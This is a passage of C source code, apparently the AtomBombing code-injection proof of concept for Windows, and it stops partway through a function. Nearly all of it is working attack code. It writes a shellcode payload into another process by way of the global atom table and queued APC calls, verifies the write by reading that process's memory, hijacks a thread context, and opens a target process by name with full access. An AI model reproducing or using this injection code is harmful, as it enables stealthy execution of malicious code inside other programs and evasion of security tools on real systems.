#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>

#include "..\Release\AtomBombingShellcode.h"

#define RTL_MAXIMUM_ATOM_LENGTH (255)
#define SHELLCODE_FUNCTION_POINTERS_OFFSET (25)

#define X86_RET ('\xc3')

#define TEXT_SECTION (".text")
#define DATA_SECTION (".data")

#define NTDLL ("ntdll.dll")
#define KERNEL32 ("kernel32.dll")
#define NTSETCONTEXTTHREAD ("NtSetContextThread")
#define NTWAITFORSINGLEOBJECT ("NtWaitForSingleObject")
#define MEMCPY ("memcpy")
#define GETPROCADDRESS ("GetProcAddress")
#define LOADLIBRARYA ("LoadLibraryA")
#define GLOBALGETATOMNAMEW ("GlobalGetAtomNameW")
#define NTQUEUEAPCTHREAD ("NtQueueApcThread")
#define WAITFORSINGLEOBJECTEX ("WaitForSingleObjectEx")


typedef VOID(*PKNORMAL_ROUTINE)(PVOID NormalContext,
	PVOID SystemArgument1,
	PVOID SystemArgument2
	);

typedef ULONG(WINAPI * _NtQueueApcThread)(HANDLE ThreadHandle,
	PKNORMAL_ROUTINE ApcRoutine,
	PVOID NormalContext,
	PVOID SystemArgument1,
	PVOID SystemArgument2
	);

typedef NTSTATUS(NTAPI *_NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	DWORD ProcessInformationLength,
	PDWORD ReturnLength
	);

#pragma pack(push, 1)
typedef struct _FUNCTIONPOINTERS
{
	void *pfnLoadLibraryA;
	void *pfnGetProcAddress;
} FUNCTIONPOINTERS, *PFUNCTIONPOINTERS;
#pragma pack(pop)

typedef enum _ESTATUS
{
	ESTATUS_INVALID = -1,
	ESTATUS_SUCCESS = 0,

	ESTATUS_MAIN_NTQUEUEAPCTHREADWRAPPER_NTQUEUEAPCTHREAD_FAILED = 0x100,

	ESTATUS_MAIN_ADDNULLTERMINATEDATOMANDVERIFYW_GLOBALADDATOMW_FAILED,

	ESTATUS_MAIN_DOESSTRINGCONTAINNULLTERMINATORW_WCSCHR_FAILED,

	ESTATUS_MAIN_GETTHREADTEBADDRESS_NTQUERYINFORMATIONTHREAD_ERROR,

	ESTATUS_MAIN_OPENPROCESSBYNAME_OPENPROCESS_ERROR,

	ESTATUS_MAIN_GETPROCESSIDBYNAME_CREATETOOLHELP32SNAPSHOT_ERROR,
	ESTATUS_MAIN_GETPROCESSIDBYNAME_PROCESS32FIRST_ERROR,
	ESTATUS_MAIN_GETPROCESSIDBYNAME_PROCESS_NOT_FOUND,

	ESTATUS_MAIN_GETTHREADTEBADDRESS_GETTHREADSELECTORENTRY_FAILED,
	
	ESTATUS_MAIN_NTQUEUEAPCTHREADWRAPPERANDKEEPALERTABLE_SUSPENDTHREAD_FAILED,
	ESTATUS_MAIN_NTQUEUEAPCTHREADWRAPPERANDKEEPALERTABLE_RESUMETHREAD_FAILED,

	ESTATUS_MAIN_QUEUEUSERAPCWRAPPERANDKEEPALERTABLE_SUSPENDTHREAD_FAILED,
	ESTATUS_MAIN_QUEUEUSERAPCWRAPPERANDKEEPALERTABLE_RESUMETHREAD_FAILED,
	ESTATUS_MAIN_QUEUEUSERAPCWRAPPERANDKEEPALERTABLE_QUEUEUSERAPC_FAILED,
	
	ESTATUS_MAIN_APCWRITEPROCESSMEMORYNULLTERMINATEDINTERNAL_BUFFER_CONTAINS_NULL,
	
	ESTATUS_MAIN_FINDALERTABLETHREAD_NO_ALERTABLE_THREADS_FOUND,

	ESTATUS_MAIN_GETTHREADCONTEXT_SUSPENDTHREAD_FAILED,
	ESTATUS_MAIN_GETTHREADCONTEXT_GETTHREADCONTEXT_FAILED,
	ESTATUS_MAIN_GETTHREADCONTEXT_RESUMETHREAD_FAILED,
	
	ESTATUS_MAIN_GETSECTIONHEADER_SECTION_NOT_FOUND,

	ESTATUS_MAIN_GETCODECAVEADDRESS_GETMODULEHANDLEA_FAILED,

	ESTATUS_MAIN_FINDRETGADGET_GETMODULEHANDLEA_FAILED,
	ESTATUS_MAIN_FINDRETGADGET_RET_GADGET_NOT_FOUND,

	ESTATUS_GETFUNCTIONADDRESSFROMDLL_GETMODULEHANDLEA_FAILED,
	ESTATUS_GETFUNCTIONADDRESSFROMDLL_GETPROCADDRESS_FAILED,

	ESTATUS_MAIN_ISPROCESSMEMORYEQUAL_HEAPALLOC_FAILED,
	ESTATUS_MAIN_ISPROCESSMEMORYEQUAL_READPROCESSMEMORY_FAILED,
	ESTATUS_MAIN_ISPROCESSMEMORYEQUAL_READPROCESSMEMORY_MISMATCH,

	ESTATUS_MAIN_ADDNULLTERMINATEDATOMANDVERIFYW_GLOBALDELETEATOM_FAILED,

	ESTATUS_MAIN_WASATOMWRITTENSUCCESSFULLY_GLOBALGETATOMNAMEW_FAILED,
	ESTATUS_MAIN_WASATOMWRITTENSUCCESSFULLY_HEAPALLOC_FAILED,

	ESTATUS_MAIN_ENUMPROCESSTHREADS_OPENTHREAD_FAILED,

	ESTATUS_MAIN_FINDALERTABLETHREAD_HEAPALLOC_FAILED,
	ESTATUS_MAIN_FINDALERTABLETHREAD_HEAPALLOC2_FAILED,
	ESTATUS_MAIN_FINDALERTABLETHREAD_CREATEEVENT_FAILED,
	ESTATUS_MAIN_FINDALERTABLETHREAD_DUPLICATEHANDLE_FAILED,
	ESTATUS_MAIN_FINDALERTABLETHREAD_WAITFORMULTIPLEOBJECTS_FAILED,

} ESTATUS, *PESTATUS;

#define ESTATUS_FAILED(eStatus) (ESTATUS_SUCCESS != eStatus)

ESTATUS GetFunctionAddressFromDll(
	PSTR pszDllName,
	PSTR pszFunctionName,
	PVOID *ppvFunctionAddress
	)
{
	HMODULE hModule = NULL;
	PVOID	pvFunctionAddress = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;

	hModule = GetModuleHandleA(pszDllName);
	if (NULL == hModule)
	{
		eReturn = ESTATUS_GETFUNCTIONADDRESSFROMDLL_GETMODULEHANDLEA_FAILED;
		goto lblCleanup;
	}

	pvFunctionAddress = GetProcAddress(hModule, pszFunctionName);
	if (NULL == pvFunctionAddress)
	{
		eReturn = ESTATUS_GETFUNCTIONADDRESSFROMDLL_GETPROCADDRESS_FAILED;
		goto lblCleanup;
	}

	*ppvFunctionAddress = pvFunctionAddress;
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;
}

ESTATUS main_WasAtomWrittenSuccessfully(
	ATOM tAtom,
	PWSTR pswzExpectedBuffer,
	PBOOL pbWasAtomWrittenSuccessfully
	)
{
	LPWSTR pswzCheckBuffer = NULL;
	DWORD cbCheckBuffer = 0;
	ESTATUS eReturn = ESTATUS_INVALID;
	UINT uiRet = 0;
	HMODULE hUser32 = NULL;
	BOOL bWasAtomWrittenSuccessfully = FALSE;

	// If user32.dll is not loaded, the ATOM functions return access denied.For more details see :
	// http://www.tech-archive.net/Archive/Development/microsoft.public.win32.programmer.kernel/2004-03/0851.html
	hUser32 = LoadLibrary(L"user32.dll");
	if (NULL == hUser32)
	{
		goto lblCleanup;
	}

	cbCheckBuffer = (wcslen(pswzExpectedBuffer) + 1) * sizeof(WCHAR);

	pswzCheckBuffer = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbCheckBuffer);
	if (NULL == pswzCheckBuffer)
	{
		printf("HeapAlloc failed. GLE: 0x%X (%d)\n\n", GetLastError(), GetLastError());
		eReturn = ESTATUS_MAIN_WASATOMWRITTENSUCCESSFULLY_HEAPALLOC_FAILED;
		goto lblCleanup;
	}

	uiRet = GlobalGetAtomNameW(tAtom, pswzCheckBuffer, cbCheckBuffer);
	if (0 == uiRet)
	{
		printf("GlobalGetAtomNameA failed. GLE: 0x%X (%d)\n\n", GetLastError(), GetLastError());
		eReturn = ESTATUS_MAIN_WASATOMWRITTENSUCCESSFULLY_GLOBALGETATOMNAMEW_FAILED;
		goto lblCleanup;
	}

	bWasAtomWrittenSuccessfully = (0 == memcmp(pswzCheckBuffer, pswzExpectedBuffer, cbCheckBuffer));

	eReturn = ESTATUS_SUCCESS;
	*pbWasAtomWrittenSuccessfully = bWasAtomWrittenSuccessfully;

lblCleanup:
	if (NULL != pswzCheckBuffer)
	{
		HeapFree(GetProcessHeap(), 0, pswzCheckBuffer);
		pswzCheckBuffer = NULL;
	}
	return eReturn;
}

ESTATUS main_AddNullTerminatedAtomAndVerifyW(LPWSTR pswzBuffer, ATOM *ptAtom)
{
	ATOM tAtom = 0;
	ESTATUS eReturn = ESTATUS_INVALID;
	LPWSTR pswzCheckBuffer = NULL;
	DWORD cbCheckBuffer = 0;
	UINT uiRet = 0;
	HMODULE hUser32 = NULL;
	BOOL bWasAtomWrittenSuccessfully = FALSE;

	// If user32.dll is not loaded, the ATOM functions return access denied. For more details see :
	// http://www.tech-archive.net/Archive/Development/microsoft.public.win32.programmer.kernel/2004-03/0851.html
	hUser32 = LoadLibrary(L"user32.dll");

	do
	{
		tAtom = GlobalAddAtomW(pswzBuffer);
		if (0 == tAtom)
		{
			printf("GlobalAddAtomA failed. GLE: 0x%X (%d)\n\n", GetLastError(), GetLastError());
			eReturn = ESTATUS_MAIN_ADDNULLTERMINATEDATOMANDVERIFYW_GLOBALADDATOMW_FAILED;
			goto lblCleanup;
		}

		eReturn = main_WasAtomWrittenSuccessfully(tAtom, pswzBuffer, &bWasAtomWrittenSuccessfully);
		if (ESTATUS_FAILED(eReturn))
		{
			goto lblCleanup;
		}

		if (FALSE != bWasAtomWrittenSuccessfully)
		{
			break;
		}
		
		for (int i = 0; i < 0x2; i++)
		{
			SetLastError(ERROR_SUCCESS);
			GlobalDeleteAtom(tAtom);
			if (ERROR_SUCCESS != GetLastError())
			{
				eReturn = ESTATUS_MAIN_ADDNULLTERMINATEDATOMANDVERIFYW_GLOBALDELETEATOM_FAILED;
				goto lblCleanup;
			}
		}
	} while (FALSE == bWasAtomWrittenSuccessfully);
	

	eReturn = ESTATUS_SUCCESS;
	*ptAtom = tAtom;

lblCleanup:
	return eReturn;

}

ESTATUS main_NtQueueApcThreadWrapper(
	HANDLE hThread, 
	PKNORMAL_ROUTINE pfnApcRoutine, 
	PVOID pvArg1, 
	PVOID pvArg2, 
	PVOID pvArg3
	)
{
	HMODULE hNtDll = NULL;
	HMODULE hKernel32 = NULL;
	HMODULE hUser32 = NULL;
	_NtQueueApcThread NtQueueApcThread = NULL;
	NTSTATUS ntStatus = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;

	// If user32.dll is not loaded, the ATOM functions return access denied. For more details see:
	// http://www.tech-archive.net/Archive/Development/microsoft.public.win32.programmer.kernel/2004-03/0851.html
	hUser32 = LoadLibrary(L"user32.dll");
	hKernel32 = GetModuleHandle(L"kernel32.dll");
	hNtDll = GetModuleHandle(L"ntdll.dll");

	eReturn = GetFunctionAddressFromDll(
		NTDLL, 
		NTQUEUEAPCTHREAD, 
		(PVOID *) &NtQueueApcThread
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	ntStatus = NtQueueApcThread(
		hThread, 
		pfnApcRoutine, 
		pvArg1, 
		pvArg2, 
		pvArg3
		);
	if (0 != ntStatus)
	{
		printf("NtQueueApcThread failed. ret: 0x%X (%d)\n\n\n", ntStatus, ntStatus);
		eReturn = ESTATUS_MAIN_NTQUEUEAPCTHREADWRAPPER_NTQUEUEAPCTHREAD_FAILED;
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;

lblCleanup:

	return eReturn;
}

ESTATUS main_NtQueueApcThreadWaitForSingleObjectEx(
	HANDLE hRemoteThread, 
	HANDLE hWaitHandle, 
	DWORD dwWaitMilliseconds, 
	BOOL bWaitAlertable
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	PKNORMAL_ROUTINE pfnWaitForSingleObjectEx = NULL;

	eReturn = GetFunctionAddressFromDll(
		KERNEL32, 
		WAITFORSINGLEOBJECTEX, 
		(PVOID *) &pfnWaitForSingleObjectEx
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = main_NtQueueApcThreadWrapper(
		hRemoteThread, 
		pfnWaitForSingleObjectEx, 
		hWaitHandle, 
		(PVOID)dwWaitMilliseconds, 
		(PVOID)bWaitAlertable
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;

lblCleanup:

	return eReturn;
}

ESTATUS main_QueueUserApcWrapperAndKeepAlertable(
	HANDLE hThread,
	PAPCFUNC pfnAPC,
	ULONG_PTR dwData
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	DWORD dwErr = FALSE;

	dwErr = SuspendThread(hThread);
	if (((DWORD)-1) == dwErr)
	{
		eReturn = ESTATUS_MAIN_QUEUEUSERAPCWRAPPERANDKEEPALERTABLE_SUSPENDTHREAD_FAILED;
		printf("SuspendThread failed. GLE: %d.", GetLastError());
		goto lblCleanup;
	}

	dwErr = QueueUserAPC(pfnAPC, hThread, dwData);
	if (0 == dwErr)
	{
		eReturn = ESTATUS_MAIN_QUEUEUSERAPCWRAPPERANDKEEPALERTABLE_QUEUEUSERAPC_FAILED;
		printf("SuspendThread failed. GLE: %d.", GetLastError());
		goto lblCleanup;
	}

	eReturn = main_NtQueueApcThreadWaitForSingleObjectEx(
		hThread,
		GetCurrentThread(),
		5000,
		TRUE
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	dwErr = ResumeThread(hThread);
	if (((DWORD)-1) == dwErr)
	{
		printf("ResumeThread failed. GLE: %d.", GetLastError());
		eReturn = ESTATUS_MAIN_QUEUEUSERAPCWRAPPERANDKEEPALERTABLE_RESUMETHREAD_FAILED;
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;
}

ESTATUS main_NtQueueApcThreadWrapperAndKeepAlertable(
	HANDLE hThread, 
	PKNORMAL_ROUTINE pfnApcRoutine, 
	PVOID pvArg1, 
	PVOID pvArg2, 
	PVOID pvArg3
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	DWORD dwErr = FALSE;

	dwErr = SuspendThread(hThread);
	if (((DWORD)-1) == dwErr)
	{
		eReturn = ESTATUS_MAIN_NTQUEUEAPCTHREADWRAPPERANDKEEPALERTABLE_SUSPENDTHREAD_FAILED;
		printf("SuspendThread failed. GLE: %d.", GetLastError());
		goto lblCleanup;
	}

	eReturn = main_NtQueueApcThreadWrapper(
		hThread, 
		pfnApcRoutine, 
		pvArg1, 
		pvArg2, 
		pvArg3
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = main_NtQueueApcThreadWaitForSingleObjectEx(
		hThread, 
		GetCurrentThread(), 
		5000, 
		TRUE
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	dwErr = ResumeThread(hThread);
	if (((DWORD)-1) == dwErr)
	{
		printf("ResumeThread failed. GLE: %d.", GetLastError());
		eReturn = ESTATUS_MAIN_NTQUEUEAPCTHREADWRAPPERANDKEEPALERTABLE_RESUMETHREAD_FAILED;
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;
}

ESTATUS main_ApcSetEventAndKeepAlertable(HANDLE hThread, HANDLE hRemoteHandle)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	
	eReturn = main_QueueUserApcWrapperAndKeepAlertable(
		hThread, 
		(PAPCFUNC)SetEvent, 
		(ULONG_PTR)hRemoteHandle
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;
}

ESTATUS main_ApcSetThreadContextInternal(HANDLE hThread, PCONTEXT ptContext)
{
	PKNORMAL_ROUTINE pfnSetThreadContext = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;

	eReturn = GetFunctionAddressFromDll(
		NTDLL, 
		NTSETCONTEXTTHREAD, 
		(PVOID *) &pfnSetThreadContext
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}
	

	eReturn = main_NtQueueApcThreadWrapper(
		hThread, 
		pfnSetThreadContext, 
		GetCurrentThread(), 
		(PVOID)ptContext, 
		(PVOID)NULL
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;

lblCleanup:

	return eReturn;
}

ESTATUS main_DoesStringContainNullTerminatorW(
	PVOID pvBuffer, 
	DWORD dwBufferSize, 
	PBOOL pbDoesStringContainUnicodeNullTerminator
	)
{
	PWCHAR pwcPos = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;

	pwcPos = wcschr((LPWSTR)pvBuffer, UNICODE_NULL);
	if (0 == pwcPos)
	{
		eReturn = ESTATUS_MAIN_DOESSTRINGCONTAINNULLTERMINATORW_WCSCHR_FAILED;
		goto lblCleanup;
	}

	if ((DWORD)(pwcPos - (PWCHAR)pvBuffer) == (dwBufferSize / sizeof(WCHAR)-1))
	{
		*pbDoesStringContainUnicodeNullTerminator = FALSE;
	}
	else
	{
		*pbDoesStringContainUnicodeNullTerminator = TRUE;
	}

	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;
}

ESTATUS main_ApcWriteProcessMemoryNullTerminatedInternal(
	HANDLE hThread, 
	PVOID pvBaseAddress, 
	PVOID pvBuffer, 
	DWORD dwBufferSize
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	DWORD dwIndex = 0;
	HMODULE hKernel32 = NULL;
	PKNORMAL_ROUTINE pfnGlobalGetAtomNameW = NULL;
	BOOL bDoesStringContainUnicodeNullTerminator = FALSE;


	hKernel32 = GetModuleHandle(L"kernel32.dll");
	eReturn = GetFunctionAddressFromDll(
		KERNEL32, 
		GLOBALGETATOMNAMEW, 
		(PVOID *) &pfnGlobalGetAtomNameW
		);

	eReturn = main_DoesStringContainNullTerminatorW(
		pvBuffer, 
		dwBufferSize, 
		&bDoesStringContainUnicodeNullTerminator
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}
	if (FALSE != bDoesStringContainUnicodeNullTerminator)
	{
		eReturn = ESTATUS_MAIN_APCWRITEPROCESSMEMORYNULLTERMINATEDINTERNAL_BUFFER_CONTAINS_NULL;
		goto lblCleanup;
	}

	for (dwIndex = 0; dwIndex < dwBufferSize; dwIndex += (RTL_MAXIMUM_ATOM_LENGTH)* sizeof(WCHAR))
	{
		ATOM tAtom = 0;
		CHAR acBuffer[(RTL_MAXIMUM_ATOM_LENGTH + 1) * sizeof(WCHAR)] = { 0 };
		DWORD cbBlockSize = 0;

		if ((dwBufferSize - sizeof(WCHAR)) - dwIndex < (sizeof(acBuffer) - sizeof(WCHAR)))
		{
			cbBlockSize = ((dwBufferSize - sizeof(WCHAR)) - dwIndex);
		}
		else
		{
			cbBlockSize = sizeof(acBuffer) - sizeof(WCHAR);
		}

		(VOID)memcpy(acBuffer, (PVOID)((DWORD)pvBuffer + dwIndex), cbBlockSize);

		eReturn = main_AddNullTerminatedAtomAndVerifyW((LPWSTR)acBuffer, &tAtom);
		if (ESTATUS_FAILED(eReturn))
		{
			goto lblCleanup;
		}

		eReturn = main_NtQueueApcThreadWrapperAndKeepAlertable(
			hThread, 
			pfnGlobalGetAtomNameW, 
			(PVOID)tAtom, 
			((PUCHAR)pvBaseAddress) + dwIndex, 
			(PVOID)(cbBlockSize + sizeof(WCHAR))
			);
		if (ESTATUS_FAILED(eReturn))
		{
			goto lblCleanup;
		}
	}

	eReturn = ESTATUS_SUCCESS;

lblCleanup:

	return eReturn;
}

ESTATUS main_IsProcessMemoryEqual(
	HANDLE hProcess,
	PVOID pvRemoteAddress,
	PVOID pvExpectedBuffer,
	DWORD cbExpectedBufferSize,
	PBOOL pbIsMemoryEqual
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	PVOID pvTempBuffer = NULL;
	DWORD dwNumberOfBytesRead = 0;
	BOOL bErr = FALSE;
	BOOL bIsMemoryEqual = FALSE;

	pvTempBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbExpectedBufferSize);
	if (NULL == pvTempBuffer)
	{
		eReturn = ESTATUS_MAIN_ISPROCESSMEMORYEQUAL_HEAPALLOC_FAILED;
		goto lblCleanup;
	}

	bErr = ReadProcessMemory(
		hProcess,
		pvRemoteAddress,
		pvTempBuffer,
		cbExpectedBufferSize,
		&dwNumberOfBytesRead
		);
	if (FALSE == bErr)
	{
		eReturn = ESTATUS_MAIN_ISPROCESSMEMORYEQUAL_READPROCESSMEMORY_FAILED;
		printf("ReadProcessMemory error. GLE: %d.", GetLastError());
		goto lblCleanup;
	}

	if (dwNumberOfBytesRead != cbExpectedBufferSize)
	{
		eReturn = ESTATUS_MAIN_ISPROCESSMEMORYEQUAL_READPROCESSMEMORY_MISMATCH;
		goto lblCleanup;
	}

	if (0 == memcmp(pvTempBuffer, pvExpectedBuffer, cbExpectedBufferSize))
	{
		bIsMemoryEqual = TRUE;
	}

	eReturn = ESTATUS_SUCCESS;
	*pbIsMemoryEqual = bIsMemoryEqual;

lblCleanup:
	if (NULL != pvTempBuffer)
	{
		HeapFree(GetProcessHeap(), 0, pvTempBuffer);
		pvTempBuffer = NULL;
	}

	return eReturn;

}

ESTATUS main_ApcWriteProcessMemoryNullTerminated(
	HANDLE hProcess, 
	HANDLE hThread, 
	PVOID pvBaseAddress, 
	PVOID pvBuffer, 
	DWORD dwBufferSize
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	BOOL bShouldStop = FALSE;

	do
	{
		eReturn = main_ApcWriteProcessMemoryNullTerminatedInternal(
			hThread, 
			pvBaseAddress, 
			pvBuffer, 
			dwBufferSize
			);
		if (ESTATUS_FAILED(eReturn))
		{
			goto lblCleanup;
		}

		Sleep(100);

		eReturn = main_IsProcessMemoryEqual(
			hProcess,
			pvBaseAddress,
			pvBuffer,
			dwBufferSize,
			&bShouldStop
			);
		if (ESTATUS_FAILED(eReturn))
		{
			goto lblCleanup;
		}

		if (FALSE == bShouldStop)
		{
			printf("[*] Data chunk written incorrectly, retrying...\n\n\n");
		}

	} while (FALSE == bShouldStop);

	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;
}

ESTATUS main_ApcWriteProcessMemoryInternal(
	HANDLE hProcess, 
	HANDLE hThread, 
	PVOID pvBaseAddress, 
	PVOID pvBuffer, 
	DWORD dwBufferSize
	)
{
	PWCHAR pwcPos = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;
	PVOID pvTempBuffer = NULL;
	PVOID pvLocalBufferPointer = pvBuffer;
	PVOID pvRemoteBufferPointer = pvBaseAddress;
	DWORD dwBytesWritten = 0;

	while (pvLocalBufferPointer < (PUCHAR)pvBuffer + dwBufferSize)
	{
		DWORD cbTempBufferSize = 0;
				
		pwcPos = (PWCHAR)pvLocalBufferPointer + wcsnlen_s(
			(LPWSTR)pvLocalBufferPointer, 
			(dwBufferSize - dwBytesWritten) / sizeof(WCHAR)
			);
		if (0 == pwcPos)
		{
			goto lblCleanup;
		}
		if (pvLocalBufferPointer == pwcPos)
		{
			pvRemoteBufferPointer = (PUCHAR)pvRemoteBufferPointer + sizeof(UNICODE_NULL);
			pvLocalBufferPointer = (PUCHAR)pvLocalBufferPointer + sizeof(UNICODE_NULL);
			dwBytesWritten += sizeof(UNICODE_NULL);
			continue;
		}

		cbTempBufferSize = (PUCHAR)pwcPos - (PUCHAR)pvLocalBufferPointer;

		pvTempBuffer = HeapAlloc(
			GetProcessHeap(), 
			HEAP_ZERO_MEMORY, 
			cbTempBufferSize + sizeof(UNICODE_NULL)
			);
		if (NULL == pvTempBuffer)
		{
			goto lblCleanup;
		}

		memcpy(pvTempBuffer, pvLocalBufferPointer, cbTempBufferSize);

		eReturn = main_ApcWriteProcessMemoryNullTerminated(
			hProcess, 
			hThread, 
			pvRemoteBufferPointer, 
			pvTempBuffer, 
			cbTempBufferSize + sizeof(UNICODE_NULL)
			);
		if (ESTATUS_FAILED(eReturn))
		{
			goto lblCleanup;
		}
		pvRemoteBufferPointer = (PUCHAR)pvRemoteBufferPointer + cbTempBufferSize;
		pvLocalBufferPointer = (PUCHAR)pvLocalBufferPointer + cbTempBufferSize;
		dwBytesWritten += cbTempBufferSize;
		
		if (NULL != pvTempBuffer)
		{
			HeapFree(GetProcessHeap(), 0, pvTempBuffer);
			pvTempBuffer = NULL;

		}
	}

	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	if (NULL != pvTempBuffer)
	{
		HeapFree(GetProcessHeap(), 0, pvTempBuffer);
		pvTempBuffer = NULL;
	}

	return eReturn;


}

ESTATUS main_ApcWriteProcessMemory(
	HANDLE hProcess,
	HANDLE hThread,
	PVOID pvBaseAddress,
	PVOID pvBuffer,
	DWORD dwBufferSize
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	BOOL bShouldStop = FALSE;

	do
	{
		eReturn = main_ApcWriteProcessMemoryInternal(
			hProcess,
			hThread,
			pvBaseAddress,
			pvBuffer,
			dwBufferSize
			);
		if (ESTATUS_FAILED(eReturn))
		{
			goto lblCleanup;
		}

		Sleep(100);

		eReturn = main_IsProcessMemoryEqual(
			hProcess, 
			pvBaseAddress, 
			pvBuffer, 
			dwBufferSize, 
			&bShouldStop
			);
		if (ESTATUS_FAILED(eReturn))
		{
			goto lblCleanup;
		}

		if (bShouldStop)
		{
			printf("[*] New verification: Data chunk written successfully.\n\n\n");
			break;
		}

		printf("[*] New Verification: Data written incorrectly, retrying...\n\n\n");

	} while (TRUE);

	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;
}

ESTATUS main_ApcSetThreadContext(
	HANDLE hProcess, 
	HANDLE hThread, 
	PCONTEXT ptContext, 
	PVOID pvRemoteAddress
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;

	eReturn = main_ApcWriteProcessMemory(
		hProcess,
		hThread,
		(PVOID)((PUCHAR)pvRemoteAddress),
		ptContext,
		FIELD_OFFSET(CONTEXT, ExtendedRegisters)
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = main_ApcSetThreadContextInternal(hThread, (PCONTEXT)((PUCHAR)pvRemoteAddress));
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;

}

ESTATUS main_ApcCopyFunctionPointers(
	HANDLE hProcess, 
	HANDLE hThread, 
	PVOID pvRemoteAddress
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	FUNCTIONPOINTERS tFunctionPointers = { 0 };

	eReturn = GetFunctionAddressFromDll(
		KERNEL32, 
		LOADLIBRARYA, 
		&tFunctionPointers.pfnLoadLibraryA
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = GetFunctionAddressFromDll(
		KERNEL32, 
		GETPROCADDRESS, 
		&tFunctionPointers.pfnGetProcAddress
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = main_ApcWriteProcessMemory(
		hProcess, 
		hThread, 
		pvRemoteAddress, 
		&tFunctionPointers, 
		sizeof(tFunctionPointers)
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;

}

ESTATUS main_GetProcessIdByName(LPWSTR pszProcessName, PDWORD pdwProcessId)
{
	DWORD dwProcessId = 0;
	HANDLE hSnapshot = NULL;
	PROCESSENTRY32 pe = { 0 };
	ESTATUS eReturn = ESTATUS_INVALID;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (NULL == hSnapshot)
	{
		eReturn = ESTATUS_MAIN_GETPROCESSIDBYNAME_CREATETOOLHELP32SNAPSHOT_ERROR;
		printf("CreateToolhelp32Snapshot error. GLE: %d.", GetLastError());
		goto lblCleanup;
	}

	pe.dwSize = sizeof(PROCESSENTRY32);
	if (FALSE == Process32First(hSnapshot, &pe))
	{
		eReturn = ESTATUS_MAIN_GETPROCESSIDBYNAME_PROCESS32FIRST_ERROR;
		printf("Process32First error. GLE: %d.", GetLastError());
		goto lblCleanup;
	}

	do
	{
		if (NULL != wcsstr(pe.szExeFile, pszProcessName))
		{
			dwProcessId = pe.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapshot, &pe));

	if (0 == dwProcessId)
	{
		printf("[*] Process '%S' could not be found.\n\n\n", pszProcessName);
		eReturn = ESTATUS_MAIN_GETPROCESSIDBYNAME_PROCESS_NOT_FOUND;
		goto lblCleanup;
	}

	printf("[*] Found process '%S'. PID: %d (0x%X).\n\n\n", pszProcessName, dwProcessId, dwProcessId);
	*pdwProcessId = dwProcessId;
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	if ((NULL != hSnapshot) && (INVALID_HANDLE_VALUE != hSnapshot))
	{
		CloseHandle(hSnapshot);
		hSnapshot = NULL;
	}
	return eReturn;

}

ESTATUS main_OpenProcessByName(LPWSTR pszProcessName, PHANDLE phProcess)
{
	HANDLE hProcess = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;
	DWORD dwPid = 0;

	eReturn = main_GetProcessIdByName(pszProcessName, &dwPid);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		dwPid
		);
	if (NULL == hProcess)
	{
		eReturn = ESTATUS_MAIN_OPENPROCESSBYNAME_OPENPROCESS_ERROR;
		printf("OpenProcess error. GLE: %d.", GetLastError());
		goto lblCleanup;
	}

